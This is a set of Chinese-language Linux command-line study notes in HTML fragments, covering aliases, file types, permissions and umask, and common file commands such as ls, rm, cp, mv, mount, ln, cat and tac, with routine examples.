$ hash foo 2>/dev/null || { echo >&2 "I require foo but it's not installed.  Aborting."; exit 1; }

【 清屏 】
在windows的DOS操作界面里面清屏的命令是cls,那么在linux里面的清屏命令是什么
1、clear命令将会刷新屏幕
本质上是让终端显示页向后翻了一页,如果向上滚动屏幕还可以看到之前的操作信息
2、Ctrl+l(小写的L)
清屏的快捷键,清屏效果同clear命令一样
3、reset命令
将完全刷新终端屏幕,之前的终端输入操作信息将都会被清空,虽然比较清爽,但整个命令过程速度有点慢,使用较少

</pre>

<h4>alias命令</h4><pre>
alias  # 查看到系统中已经生效的别名
alias 别名='原命令名'
alias vi='vim'  # 将vi设置成vim的别名
这里设置的别名在系统重启之后就会恢复到系统默认设置无法再生效,需要重新设置才可使用

设置别名永久生效以及删除别名
写入环境变量配置文件,每个用户下对应了一个操作环境的配置文件,这里修改保存后系统重启后别名依旧生效
sudo vim ~/.bashrc
alias ll='ls -alF'
alias dir="ls -alF"    # 输入dir相当于执行ls -alF
sudo source ~/.bashrc  # 生效操作

因为在WSL中window的盘符都是挂载在/mnt下的,所以设置alias有助于快速的访问window目录
vim ~/.bashrc
alias cdc='cd /mnt/c/'  # cdc就可以直接进入d盘了
alias cdd='cd /mnt/d/'  # cdd就可以直接进入d盘了
alias cde='cd /mnt/e/'

unalias
删除别名,如果只输入该命令是临时删除,环境变量配置文件里如果没有删除命令记录的话,系统重启后依旧会生效。若要永久删除,执行该命令后还要去环境变量配置文件里把该别名的命令行删掉

命令生效顺序:
第一顺位执行绝对路径或相对路径执行的命令。
第二顺位执行别名。
第三顺位执行Bash的内部命令。
第四顺位执行按照$PATH环境变量定义的目录查找顺序找到的第一个命令。(外部命令主要依托于$PATH环境变量定义的目录来查找的)
由此可见,别名的优先级是高于Bash和$PATH命令的

</pre>
</div>

<div id="dirfile">
<h3>linux文件目录权限 permission</h3><pre>
home is writable,but not outside
apt命令是在用户主目录之外的系统目录安装文件,所以权限不足,需要使用root用户或使用sudo

【 linux文件扩展名 】
任何设备在Linux下面都是文件

文件种类
1、普通文件,使用ls -al所显示的第一个字符为"-"的文件。
普通文件分为:1.纯文本文件:LInux'系统最多的一种文件类型,内容可以直接读到;2.二进制文件:系统仅认识且可以执行二进制文件;3.数据格式文件:有些程序在运行程序中会读取某些特定类型的文件,这些特定格式的文件就是数据文件,不可以直接读取,全是乱码
2、目录:第一个属性为"d"的文件即通常说的文件夹。
3、连接文件:类似windows下面的快捷方式,第一个属性为l。
4、设备与设备文件:与设备外设及存储有关的文件,通常集中在/dev目录。通常分为两种:
(1)块(block)设备文件:存储数据,以提供系统随机访问的接口设备,如硬盘,软盘等,第一个属性为b。
(2)字符设备文件(character):一些串行端口的接口设备,如键盘,鼠标等。这些设备的特性就是"一次性读取",不能够截断输出,第一个属性为c。
5、套接字(sockets):被称为数据接口文件,通常用于在网络上的数据连接。第一个属性为s,一般在/var/run目录下。
6、管道:一种特殊的文件类型,它主要目的在解决多个程序同时访问一个文件所造成的错误问题,第一个属性为p

Linux文件扩展名
基本上LInux的文件是没有所谓的扩展名,在Linux一个文件是否能被执行,和后缀名没有太大关系,主要看文件的10个属性
不过可以被执行和执行成功是不一样的,能不能执行成功要看文件的实际内容,但仍然希望可以有扩展名现实该文件是什么东西,所以通常还是会以适当的扩展名来表示该文件是什么种类
.txt - 纯文本文件
.sh - 脚本或批处理文件
.tar - tar打包文件(是包文件不是压缩文件)
.tar.gz,zip - 经过打包的压缩文件,不同的压缩软件取不同的扩展名
.bz2 - bzip2的压缩文件
.gz - gzip的压缩文件
.tbz - tar打包并用bzip压缩文件
.tgz - tar打包并用gzip压缩的文件
.gif - gif图象文件
.jpg - JPEG图象文件
.png - PNG图象文件
.pdf - 电子文档(PDF格式的)
.html/.htm - HTML文件
.php - php文件
.ps - postscinpt文件(打印格式文件)
.au - audio文件
.wav - audio文件
.xpm - 图象文件
.conf - 配置文件
.lock - LOCK文件,用来判断一个文件或设备是否被使用
.rpm - REDHATPackage.Manager文件,套件包或软件包
.c - C源程序代码文件
.cpp - C++源程序代码文件
.h - C或C++程序的头文件
.o - 程序目标文件
.pl - perl脚本文件
.so - 类库文件
*.doc *.obt - OpenOffice能打开的文件

现在的Linux桌面环境和Windows一样智能化,文件的类型是和相应的程序关联的。在打开某个文件时系统会自动判断用哪个应用程序打开
在Linux中带有扩展名的文件,只能代表程序的关联,并不能说明文件是可以执行,从这方面来说Linux的扩展名没有太大的意义

Linux文件长度限制
在linux中使用默认的Ext2/Ext3文件系统,因此单文件或目录的最大容许文件名为255个字符,包含完整路径名称及目录(/)的完整名为4096个字符

【 linux文件系统 】
Linux的目录结构为树状结构,最顶级的目录为根目录/
路径的写法由根目录/写起,例如/usr/share/doc目录
路径的写法以./或../开头,例如由/usr/share/doc要到/usr/share/man底下时可以写成cd ../man

ll或ls –l命令来显示一个文件的属性以及文件所属的用户和组
$ ls -l file   # 查看文件
$ ls -ld dir   # 查看目录

Linux系统按文件所有者、文件所有者同组用户和其他用户来规定了不同的文件访问权限
berlin@LAPTOP-0KMQM01D:~$ ll
total 8
drwxr-xr-x 0 berlin berlin 4096 Mar  7 17:00 ./
drwxr-xr-x 0 root   root   4096 Mar  7 17:00 ../
-rw-r--r-- 1 berlin berlin  220 Mar  7 17:00 .bash_logout
-rw-r--r-- 1 berlin berlin 3771 Mar  7 17:00 .bashrc
-rw-r--r-- 1 berlin berlin  655 Mar  7 17:00 .profile

每个文件的属性由左边第一部分的10个字符来确定

第0位确定文件类型,是目录、文件或链接文件等
当为[ d ]则是目录
当为[ - ]则是文件;
若是[ l ]则表示为链接文档(link file或sym link);
若是[ b ]则表示为装置文件里面的可供储存的接口设备(可随机存取装置);
若是[ c ]则表示为装置文件里面的串行端口设备,例如键盘、鼠标(一次性读取装置)。

剩余字符三个为一组,均为『rwx』的三个参数的组合,r代表可读(read)、w代表可写(write)、x代表可执行(execute),无权限no perm就会出现减号-
第1-3位确定属主(该文件的所有者owner)拥有该文件的权限,分为读权限r、写权限w、执行权限x,"-"字符表示没有读权限
第4-6位确定属组(所有者的同组用户group)拥有该文件的权限
第7-9位确定其他用户world拥有该文件的权限。

-rwxr-xr-x:rwx(Owner)r-x(Group)r-x(Other)　　
使用者自己可读,可写,可执行;同一组的用户可读,不可写,可执行;其它用户可读,不可写,可执行

对目录有写权限表示create/delete/rename file
对目录有执行权限表示cd dir,目录在创建的时候默认有执行权限

有一些程序属性的执行部分不是X,而是S,这表示执行这个程序的使用者,临时可以有和拥有者一样权力的身份来执行该程序。一般出现在系统管理之类的指令或程序,让使用者执行时拥有root身份。　

【 Linux新建文件/目录的默认权限 】
新建文件默认权限为666,新建目录默认权限为777。但要减去umask的值,umask值可以使用umask命令看到,一般情况下root用户的为022,普通用户为002。这里的减并非数字上相减,而是减去相应的权限。如果umask为022则表示:user不减权限,group减掉write权限,other减掉write权限;如果umask为245表示user减去write权限,group减去read权限,other减去read和execute权限。

对于目录,默认权限=777-umask
对于文件,默认权限=666-umask(文件默认无执行权限)

uamsk的修改
vim /etc/bashrc     # 71行是普通用户的更改,73是超级用户的更改
vim /etc/profile    # 60行是普通用户的更改,62是超级用户的更改
source /etc/bashrc  # 刷新bash配置
source /etc/profile # 刷新系统配置

示例1,root用户umask为022,创建文件和目录后默认的权限
root@db2a:/tmp# umask
0022
root@db2a:/tmp# touch file1
root@db2a:/tmp# ls -l file1
-rw-r--r-- 1 root root 0 Aug 20 17:07 file1
root@db2a:/tmp# mkdir dir1
root@db2a:/tmp# ls -ld dir1/
drwxr-xr-x 2 root root 4096 Aug 20 17:12 dir1/

示例2,普通用户umask为002:
qingsong@db2a:/tmp$ umask
0002
qingsong@db2a:/tmp$ touch file2
qingsong@db2a:/tmp$ ls -l file2
-rw-rw-r-- 1 qingsong qingsong 0 Aug 20 17:11 file2
qingsong@db2a:/tmp$ mkdir dir2
qingsong@db2a:/tmp$ ls -ld dir2
drwxrwxr-x 2 qingsong qingsong 4096 Aug 20 17:13 dir2

示例3,一个极端的情况,将umask设置为666,则新建文件没有"任何"权限:
root@db2a:/tmp# umask 666
root@db2a:/tmp# umask
0666
root@db2a:/tmp# touch file3
root@db2a:/tmp# ls -l file3
---------- 1 root root 0 Aug 20 17:16 file3

【 文件属主和属组 - 更改文件属性 】
1、更改文件属组
chgrp [-R] 属组名文件名
-R:递归更改文件属组,就是在更改某个目录文件的属组时,如果加上-R的参数,那么该目录下的所有文件的属组都会更改

2、更改文件属组主,也可以同时更改文件属组,R表示递归
chown [–R] 属主名 文件名
chown [-R] 属主名:属组名 文件名

3、chmod:更改文件9个属性
chmod [-R] xyz 文件或目录
xyz : 数字类型的权限属性,为rwx属性数值的相加
-R : 进行递归(recursive)的持续变更,亦即连同次目录下的所有文件都会变更

Linux文件属性有两种设置方法:数字和符号。
Linux文件的基本权限就有九个,分别是owner/group/others三种身份各有自己的read/write/execute权限。
文件的权限字符为:『-rwxrwxrwx』, 这九个权限是三个一组的,其中可以使用数字来代表各个权限,各权限的分数对照表如下:
r:4
w:2
x:1
每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的,例如当权限为[-rwxrwx---],该文件的权限数字就是770
owner = rwx = 4+2+1 = 7
group = rwx = 4+2+1 = 7
others= --- = 0+0+0 = 0

还有一个改变权限的方法,九个权限分别是user、group、others三种身份,那么就可以藉由u,g,o来代表三种身份的权限
此外a则代表all即全部的身份,那么读写的权限就可以写成r、w、x
chmod  u/g/o/a  +(加入)/-(除去)/=(设定)  r/w/x  文件或目录
如果需要将文件权限设置为 -rwxr-xr-- ,可以使用 chmod u=rwx,g=rx,o=r filename来设定:

u:表示文件所有者
g:表示同组用户
o:表示其它用户
a:表示所有用户
opt则是代表操作,可以为:
+:添加某个权限
-:取消某个权限
=:赋予给定的权限,并取消原有的权限
而mode则代表权限:
r:可读 4
w:可写 2
x:可执行 1

可以采用八进制设置权限
$ chmod 666 filename   # 用户和组有读写权限

</pre><textarea>$ touch test1                    // 创建test1文件
$ ls -l test1                    // 查看test 默认权限
-rw-r--r-- 1 root root 0 Nov 15 10:32 test1
$ chmod u=rwx,g=rx,o=r  test1    // 修改test1权限
$ ls -l test1
-rwxr-xr-- 1 root root 0 Nov 15 10:32 test1

// 拿掉全部人的可执行权限
$ chmod  a-x test1
$ ls -l test1
-rw-r--r-- 1 root root 0 Nov 15 10:32 test1

$ chmod +x hello.sh  # 赋于可执行权限

</textarea>

<h4>处理目录的常用命令</h4><pre>
Linux统计文件文件夹数量
ls -l | grep "^-" | wc -l   # 统计当前文件夹下文件的个数
find ./company -type f | wc -l  # 统计当前文件夹下文件的个数
ls -lR | grep "^-" | wc -l  # 查看某文件夹下文件的个数,包括子文件夹里的
ls -lR | grep "^d" | wc -l  # 查看某文件夹下文件夹的个数,包括子文件夹里的

Linux查看文件夹大小
du -sh  # 查看当前文件夹大小
du -sh * | sort -n # 统计当前文件夹大小,并按文件大小排序
du -sk filename # 查看指定文件大小

【 stat命令 】
stat 文件名称:查看文件或文件夹的具体存储信息和时间等信息

$ stat hello.php
  File: 'hello.php'
  Size: 222             Blocks: 0          IO Block: 4096   regular file
Device: 2h/2d   Inode: 56576470318842300  Links: 1
Access:(0666/-rw-rw-rw-)  Uid:( 1000/berlin75)   Gid:( 1000/berlin75)
Access: 2018-07-02 00:08:20.095847600 +0800
Modify: 2018-07-02 00:09:45.301883300 +0800
Change: 2018-07-02 00:09:45.301883300 +0800
 Birth: -

【 file命令 】
file 文件名:查看文件的类型
文件的类型依据文件的内容,而不是文件的后缀名(扩展名),去掉文件的后缀名(扩展名)之后,系统依然能识别文件的类型

linux几种文件类型:
d:表示此文件是一个目录
-:表示此文件是一个普通文件
b:表示此文件是一个特殊的块设备I/O文件
c:表示此文件是一个特殊的字符设备I/O文件
l:表示此文件是一个连接文件。在其文件名称后紧跟与它连接的文件路径及名称
s:表示此文件是套接字文件
p:命名管道文件

$ file sed.txt        # sed.txt: ASCII text
$ file get-docker.sh  # get-docker.sh: POSIX shell script, ASCII text executable
$ file .bashrc        # .bashrc: ASCII text

$ file hello.php      # hello.php: PHP script, ASCII text
$ file hello.php      # hello.php: PHP script, UTF-8 Unicode text, with CRLF line terminators

$ touch hello.html
$ file hello.html     # hello.html: empty
$ vi hello.html
$ file hello.html     # hello.html: HTML document, ASCII text
$ wget www.baidu.com
$ file index.html     # index.html: HTML document, UTF-8 Unicode text, with very long lines, with CRLF line terminators
$ mv index.html index
$ file index          # index.html: HTML document, UTF-8 Unicode text, with very long lines, with CRLF line terminators

【 tree命令 】
sudo apt install tree
显示当前目录下的目录结构树

【 ls命令 】
列出目录文件 list
-a : 显示所有文件及目录,连同隐藏档(ls内定将文件名或目录名称开头为"."的视为隐藏档,不会列出)一起列出来
-d : 仅列出目录本身,而不是列出目录内的文件数据
-l : 除文件名称外,亦将文件型态、权限、拥有者、文件大小等资讯详细列出
-r : 将文件以相反次序显示(原定依英文字母次序)
-t : 将文件依建立时间之先后次序列出
-A : 同-a ,但不列出"."(目前目录)及".."(父目录)
-F : 在列出的文件名称后加一符号,可执行档则加"*",目录则加"/"
-R : 若目录下有文件则以下之文件亦皆依序列出

alias ll = 'ls -alF'
alias tree = 'ls -AlR'
alias tree = find

$ ls --help

$ ls        # 列出当前目录可见文件
$ ls -al    # 列出用户主目录下的所有文件
$ ls -al test1          # 查看test1文件的权限等信息
$ ls -al | grep '^d     # 显示目录
$ ls -al | grep '^[^d]' # 在一个目录中查询不包含目录的所有文件

$ ls /          # 列出根目录(\)下的所有目录
$ ls -ltr s*    # 列出目前工作目录下所有名称是 s 开头的文件,越新的排越后面
$ ls -lR /bin   # 将 /bin 目录以下所有目录及文件详细资料列出
$ ls -AF        # 列出目前工作目录下所有文件及目录;目录于名称后加 "/", 可执行档于名称后加 "*" :

只显示目录
1、ls -d *
2、find . -type d -maxdepth 1
3、ls -F | grep '/$'
4、ls -l | grep '^d'

只显示文件
ls -l | grep ^-

修改ls显示的时间格式
$ vi ~/.bash_profile
$ source ~/.bash_profile
$ cat ~/.bash_profile | grep TIME
export TIME_STYLE='+%Y/%m/%d %H:%M:%S'
$ source ~/.bash_profile

【 ll命令 】
ll不是linux基本的命令,是ls -alF的一个别名
ls -alFR 同 ll -R

文件属性 文件数 拥有者 所属group 文件大小 建档日期 文件名　　
drwx------ 2 Guest users 1024 Nov 21 21:05 Mail　　
-rwx--x--x 1 root root 89080 Nov 7 22:41 tar*　　
-rwxr-xr-x 1 root bin 5013 Aug 15 9:32 uname*　　
lrwxrwxrwx 1 root root 4 Nov 24 19:30 zcat->gzip　　
-rwxr-xr-x 1 root bin 308364 Nov 29 7:43 zsh*　　
-rwsr-x--- 1 root bin 9853 Aug 15 5:46 su*　　

第一个栏位表示文件的属性。Linux的文件基本上分为三个属性:可读(r),可写(w),可执行(x),Linux是多用户多任务系统,所以一个文件可能同时被许多人使用,所以一定要设好每个文件的权限

第二个栏位表示文件个数。如果是文件的话这个数目自然是1了,如果是目录的话它的数目就是该目录中的文件个数了。　　
第三个栏位表示该文件或目录的拥有者。若使用者目前处于自己的Home,那这一栏大概都是它的账号名称。　　
第四个栏位表示所属的组(group)。每一个使用者都可以拥有一个以上的组,不过大部分的使用者应该都只属于一个组,只有当系统管理员希望给予某使用者特殊权限时才可能会给他另一个组。　　
第五栏位表示文件大小,用byte来表示,空目录一般都是1024byte,可用其它参数使文件显示的单位不同,如ls –k是用kb来显示文件的大小单位　
第六个栏位,表示创建日期,以"月,日,时间"的格式表示,如Aug 15 5:46表示8月15日早上5:46分。　　
第七个栏位,表示文件名,可以用ls –a显示隐藏的文件名。

ls -l命令第5列的数字:
1、对于普通文件,显示的是文件的大小(字节数)
2、对于设备文件是指主设备号(第6列为次设备号)
3、对于目录,是指目录大小(目录内inode列表所占空间,而不是目录内文件所占的空间大小)
4、对于符号链接,是指链接文件的路径名的字节数

【 cd命令 】
切换目录
cd ..是回到上一级目录
cd . 是当前目录
cd / 是回到根目录
cd ~ 回到用户主目录
cd   回到用户主目录
cd - 返回上一次目录
cd $OLDPWD 进入上一次的目录

【 pwd命令 】
显示目前的目录,为绝对路径名 Print Working Directory
-P  :显示出确实的路径,而非使用连结(link) 路径

【 touch命令 】
创建或更新文件
touch filename
touch README.md
touch {serial,index.txt}

$ >file.txt:创建一个文件,比touch短

【 mkdir命令 】
创建一个新的目录 make directory
-m :配置文件的权限,没有加上-m来强制配置属性时系统会使用默认属性
-p :直接将所需要的目录(包含上一级目录)递归创建起来,可以自行创建多层目录
mkdir -p test1/test2/test3/test4
mkdir -p /www/{dir1,dir2,dir3}
mkdir -m 711 test2

【 rmdir命令 】
删除一个空的目录
-p :连同上一级空的目录也一起删除

</pre>递归删除空目录<textarea>#!/bin/bash
# des: delete empty directories recursive
deleteempty() {
    find ${1:-.} -mindepth 1 -maxdepth 1 -type d | while read -r dir
    do
        if [[ -z "$(find "$dir" -mindepth 1 -type f)" ]] >/dev/null
        then
            echo "$dir"
            rm -rf ${dir} 2>&- && echo "Empty, Deleted!" || echo "Delete error"
        fi
        if [ -d ${dir} ]
        then
            deleteempty "$dir"
        fi
    done
}

deleteempty

</textarea><pre>
【 rm命令 】
移除删除文件或非空目录,remove
对于链接文件,只是断开了链接,源文件保持不变
删除有硬链接指向的文件时,使用硬链接依然可以访问原来的内容,这点与软链接是不同的
-d(--directory) :直接把欲删除的目录的硬连接数据删除成0,删除该目录;
-f(--force) :强制删除文件或目录,忽略不存在的文件,不会出现警告信息;
-i(--interactive) :互动模式,在删除前会询问用户,删除多个文件时会逐个确认
-I :在删除超过三个文件或者递归删除前要求确认。此选项比-i提示内容更少,但同样可以阻止大多数错误发生
-r(--recursive) :递归删除,最常用在目录的删除,这是非常危险的选项
-v(--verbose) :显示详细执行过程
--preserve-root:不对根目录进行递归操作

参数
文件:指定被删除的文件列表,如果参数中含有目录则必须加上-r或-R选项

删除当前目录下所有目录
$ ls -F | grep '/$' | xargs rm -r

$ rm file              # 删除文件
$ rm -r dir            # 删除目录

$ rm -r *              # 删除当前目录下除隐含文件目录外的所有文件和子目录
$ rm ./*.jpg           # 删除当前目录下所有jpg文件
$ rm -i test example   # 交互式删除当前目录下的文件test和example

要删除第1个字符"-"的文件(例如'-foo'),请使用以下方法之一:
# rm -- -foo
# rm ./ -foo

删除当前目录下所有*.txt文件,排除指定的文件test.txt
rm `ls *.txt|egrep -v test.txt`
rm `ls *.txt|awk '{if($0 != "test.txt") print $0}'`
# 排除多个文件
rm `ls *.txt|egrep -v '(test.txt|fff.txt|ppp.txt)'`
rm -f `ls *.log|egrep -v '(access-2010-09-06.log|error-2010-09-06.log)'`
rm -f `ls *.log|egrep -v '(access-2010-09-06.log|error-2010-09-06.log)'`
rm -f `ls *.log|egrep -v '(20100906.log)'`

删除文件时排除指定的文件使用通配符无效
$ ls|egrep -v *.jpg
Binary file 10.jpg matches
Binary file 11.jpg matches
Binary file 9.jpg matches
$ ls|egrep -v '(*.jpg)'
all.tar

shopt -s  extglob   # 开启扩展通配符
shopt -s            # 查看是否开启扩展通配符
rm !(1.tt)          # 删除1.tt外的所有文件

find . -not -name "1.tt" -exec rm -rf {} \
find . -not -name "1.tt" | xargs rm -rf
for i in `ls`;do if [ "$i" != 1.tt ];then rm -rf $i;fi;done;

【 cmp命令 】
compare,简要指出两个文件是否存在差异,它的使用权限是所有用户

diff命令用于两个文件之间的比较,并指出两者的不同,它的使用权限是所有用户
diff filename1 filename2

【 chmod命令 】
更改文件的读取,写入和执行权限
chmod -options filename

$ chmod --help
Usage: chmod [OPTION]... MODE[,MODE]... FILE...
  or:  chmod [OPTION]... OCTAL-MODE FILE...
  or:  chmod [OPTION]... --reference=RFILE FILE...
Change the mode of each FILE to MODE.
With --reference, change the mode of each FILE to that of RFILE.

  -c, --changes          like verbose but report only when a change is made
  -f, --silent, --quiet  suppress most error messages
  -v, --verbose          output a diagnostic for every file processed
      --no-preserve-root  do not treat '/' specially(the default)
      --preserve-root    fail to operate recursively on '/'
      --reference=RFILE  use RFILE's mode instead of MODE values
  -R, --recursive        change files and directories recursively
      --help     display this help and exit
      --version  output version information and exit

Each MODE is of the form '[ugoa]*([-+=]([rwxXst]*|[ugo])+|[-+=][0-7]+'.

【 cp命令 】
复制文件或目录,copy
-a:相当于-pdr
-d:若来源档为连结档的属性(link file),则复制连结档属性而非文件本身;
-f:为强制(force)的意思,若目标文件已经存在且无法开启则移除后再尝试一次;
-i:交互模式,若目标档(destination)已经存在时在覆盖时会先询问动作的进行
-l:进行硬式连结(hard link)的连结档创建,而非复制文件本身;
-p:连同文件的属性一起复制过去,而非使用默认属性,备份常用
-r:递归持续复制,用于目录的复制行为
-s:复制成为符号连结档(symbolic link),亦即『捷径』文件;
-u:若destination比source旧才升级destination

$ cp -i ~/.bashrc /tmp/bashrc   # 复制拷贝文件
$ cp -r dir1 dir2               # 复制拷贝目录
$ cp -rf                        # 参数f是删除已经存在的目标文件而不提示

【 mv命令 】
移动文件与目录或重命名文件  move rename
视mv命令中第二个参数类型的不同(是目标文件还是目标目录),mv命令将文件重命名或将其移至一个新的目录中。
当第二个参数类型是文件时,mv命令完成文件重命名,此时源文件或源目录名只能有一个,它将所给的源文件或目录重命名为给定的目标文件名。
当第二个参数是已存在的目录名称时,源文件或目录参数可以有多个,mv命令将各参数指定的源文件均移至目标目录中。
在跨文件系统移动文件时,mv先拷贝再将原有文件删除,而链至该文件的链接也将丢失

-b :若需覆盖文件则覆盖前先行备份。
-f :force强制的意思,如果目标文件已经存在,不会询问而直接覆盖;
-i :交互模式,若目标文件(destination)已经存在时就会询问是否覆盖
-u :若目标文件已经存在且source比较新才会升级(update)
-t : --target-directory=DIRECTORY 指定mv的目标目录,适用于移动多个源文件到一个目录的情况,此时目标目录在前源文件在后。

-b 不接受参数,mv会去读取环境变量VERSION_CONTROL来作为备份策略。
--backup该选项指定如果目标文件存在时的动作,共有四种备份策略:
1.CONTROL=none或off : 不备份。
2.CONTROL=numbered或t:数字编号的备份
3.CONTROL=existing或nil:如果存在以数字编号的备份,则继续编号备份m+1...n:
执行mv操作前已存在以数字编号的文件log2.txt.~1~,那么再次执行将产生log2.txt~2~,以次类推。如果之前没有以数字编号的文件,则使用下面讲到的简单备份。
4.CONTROL=simple或never:使用简单备份:在被覆盖前进行了简单备份,简单备份只能有一份,再次被覆盖时,简单备份也会被覆盖

mv test.log test1.txt                # 文件改名,将文件test.log重命名为test1.txt
mv test1.txt test3                   # 移动文件,将test1.txt文件移到目录test3中
mv test1.txt test3/                  # 移动文件,将test1.txt文件移到目录test3中
mv log1.txt log2.txt log3.txt test3  # 将文件log1.txt,log2.txt,log3.txt移动到目录test3中
mv -t /opt/soft/test/test4/ log1.txt log2.txt  log3.txt   # 将三个文件移动到test4目录中去
mv -i log1.txt log2.txt              # 将文件file1改名为file2,如果file2已经存在则询问是否覆盖
mv -f log3.txt log2.txt              # 将文件file1改名为file2,即使file2存在也是直接覆盖掉
mv dir1 dir2                         # 将dir1移动到dir2中,如果目录dir2不存在则将目录dir1改名为dir2
mv * ../                             # 移动当前文件夹下的所有文件到上一级目录
mv * ..                              # 移动当前文件夹下的所有文件到上一级目录
mv test3/*.txt test5                 # 把当前目录的一个子目录里的文件移动到另一个子目录里
mv log1.txt -b log2.txt              # 文件被覆盖前做简单备份,前面加参数-b

【 mount命令 】
Linux中的根目录以外的文件要想被访问,需要将其关联到根目录下的某个目录来实现,这种关联操作就是"挂载",这个目录就是"挂载点",解除次关联关系的过程称之为"卸载"

"挂载点"的目录需要以下几个要求:
(1)目录事先存在,可以用mkdir命令新建目录;
(2)挂载点目录不可被其他进程使用到;
(3)挂载点下原有文件将被隐藏。

mount命令用于挂载一个文件系统,需要root用户执行。
一个磁盘可分为若干个分区,在分区上面可以创建文件系统,而挂载点则是提供一个访问的入口,将一个分区的文件系统挂载到某个目录中,称这个目录为挂载点,并且可以通过这个挂载点访问该文件系统中的内容。

可将经常使用的设备写入文件/etc/fastab,以使系统在每次启动时自动加载
mount加载设备的信息记录在/etc/mtab文件中,查看内核追踪到的已挂载的所有设备:cat /proc/mounts
使用umount命令卸载设备时记录将被清除

此命令的最常用于挂载cdrom,使可以访问cdrom中的数据,因为将光盘插入cdrom中,Linux并不会自动挂载,必须使用mount命令来手动完成挂载

mount加载一个硬件设备
mount [参数] 要加载的设备device 载入点MOUNT_POINT

device:指明要挂载的设备
(1) 设备文件:例如/dev/sda5
(2) 卷标:-L 'LABEL', 例如 -L 'MYDATA'
(3) UUID, -U 'UUID':例如 -U '0c50523c-43f1-45e7-85c0-a126711d406e'
(4) 伪文件系统名称:proc, sysfs, devtmpfs, configfs

dir:挂载点
事先存在;建议使用空目录
进程正在使用中的设备无法被卸载

查看挂载:df
挂载设备前先fdisk -l看一下

mount挂载常用参数,Option)
-t 指定文件系统类型,例如:-t ext3、-t ext4、-t vfat
-o 指定挂载选项,例如:
-o ro,rw 以只读形式挂载,以读写形式挂载;默认是rw
-o async 代表所有操作使用缓存,内存):提高文件系统读写数据的效率;默认为async使用缓存,内存);
-o sync 代表所有操作直接写入磁盘:代表所有操作不使用缓存,而是直接写入磁盘;应用在对数据安全性比较高的场景
-o atime 代表每次访问文件时,更新文件被访问的时间,默认为atime;atime=access time的缩写
-o noatime 代表每次访问文件时,不更新文件被访问的时间
-o remount 代表重新挂载文件系统

也可将挂载配置写入/etc/fstab中,也实现自动挂载

例如一块硬盘在Linux中表示为/dev/sda 那么它上面的分区应该表示为/dev/sda1 、/dev/sda2
# mount                      # 输出系统目前的挂载信息,通过查看/etc/mtab文件显示当前系统已挂载的所有设备
# mount /dev/sda1 /mnt       # 将sda1挂载到/mnt中,cd /mnt直接通过/mnt访问内容
# mount -o remount,rw  /mnt  # 重新挂载sda1到/mnt并设置为可读写
# mount -a                   # 挂载fstab文件配置好的文件系统
mount                                                           列出系统所有的分区
mount -t iso9660 /dev/cdrom /mnt/cdrom                          挂载光盘
mount -t vfat /dev/fd0 /mnt/floppy                              挂载软盘
mount -t vfat -o iocharset=utf8,umask=000 /dev/hda2 /mnt/hda2   挂载fat32分区
mount -t ntfs -o nls=utf8,umask=000 /dev/hda3 /mnt/hda3         挂载ntfs分区
umount /mnt/hda3缷载

$ mount /dev/cdrom           # cd /mnt/cdrom进入光盘目录

u盘:
mkdir /mnt/usb               # 创建挂载目录
mount /mnt/sda1 /mnt/usb     # 挂载U盘
现在就可以使用U盘了,在/mnt/usb目录下的内容就是U盘里的内容了;使用完后,用以下命令卸载U盘即可。
umount /mnt/usb

【 umount命令 】
与mount相反,是卸载一个挂载点,即取消该入口。
# umount /mnt                 # 卸载/mnt这个挂载点的文件系统
# umount -a                   # 卸载所有已挂载的文件系统

命令umount 已挂载的设备源,/dev/sdb1) 或已挂载目的点,/mnt)
umount /dev/sdb1 == umount /mnt
例如:umount /dev/sdb1 或 umount /mnt/

如果出现device is busy报错,表示该文件系统正在被使用;
可以使用以下fuser命令,查看哪些进程在使用这个文件系统导致device is busy
fuser –m /mnt

也可以使用以下lsof命令查看这个文件系统内,有哪些文件或文件夹被打开了或正在被使用:
lsof /mnt

【 chattr lsattr 】
chattr +i filename 禁止删除
chattr -i filename 取消禁止
lsattr 查看隐藏档属性

【 dd命令备份 】
dd if="input_file" of="out_file" bs="block_size" count="number"
参数:
if:就是input file可以是设备
of:就是output file也可以是设备
bs:规划的一个block的大小,如果没有设定时预设是512bytes
count:多少个bs的意思
dd if=/etc/password of=/tmp/passwd.bak 备份

【 ln命令 】
在两个文件中创建链接,链接又分为Hard Links(硬链接)和Symbolic Links(符号链接或软链接),默认创建硬链接,使用-s参数指定创建软链接。

硬链接主要是增加一个文件的链接数,只要该文件的链接数不为0,该文件就不会被物理删除,所以删除一个具有多个硬链接数的文件,必须删除所有它的硬链接才可删除。
软链接是为文件创建了一个类似快捷方式的东西,通过该链接可以访问修改文件,但不会增加该文件的链接数,删除一个软链接并不会删除源文件,即使源文件被删除,软链接也存在,当重新创建一个同名的源文件,该软链接则指向新创建的文件。
硬链接只可链接两个文件,不可链接目录,而软链接可链接目录,所以软链接是非常灵活的。

$ ln source dest       ### 为source创建一个名为dest的硬链接
$ ln -s source dest    ### 为source创建一个名为dest的软链接

</pre>

<h4>文件内容查看</h4><pre>
【 cat命令 】
由第一行开始显示文件内容,输出文件内容到Terminal,当一个文档太长时cat只能展示最后布满屏幕的内容,前面的内容是不可见的
-A :相当于-vET的整合选项,可列出一些特殊字符而不是空白而已;
-b :列出行号,仅针对非空白行做行号显示,空白行不标行号
-E :将结尾的断行字节 $ 显示出来;
-n :列印出行号,连同空白行也会有行号,与-b的选项不同;
-T :将tab]按键以^I显示出来;
-v :列出一些看不出来的特殊字符

cat主要有三大功能:
1.一次显示整个文件。
cat filename

2.从键盘创建一个文件。
cat > 2.txt           # 用定向符创建新文件,命令行会等待用户输入,填写内容后,按ctrl+d保存内容,可直接ctrl+C退出
cat >> 2.txt
cat > filename << qq  # 创建fiename文件追加内容,遇到qq(EOF)结束输入,qq不追加进文件,只能创建新文件,不能编辑已有文件

3.将几个文件合并为一个文件:
cat file1 file2                      # 合并显示file1和file2的内容
cat file1 file2 > newcombinedfile    # 合并显示file1和file2的内容并保存到newcombinedfile

【 tac命令 】
cat命令可以显示文件的内容,反过来写就是tac,而tac也是一个Linux命令,功能就是把文件内容反过来显示,文件内容的最后一行先显示,第一行最后显示,任何须要以后进先出的顺序重新排列组件的工作都用得上tac命令

$ cat 1.txt
1
2
3
$ tac 1.txt
3
2
1

tac file | sed 1,3d| tac   # 倒置读取文件,删除最后3行,从第一行开始读取剩下的内容
tail -3 /etc/passwd | tac  # 从尾部开始读取3行

【 EOF写法 】
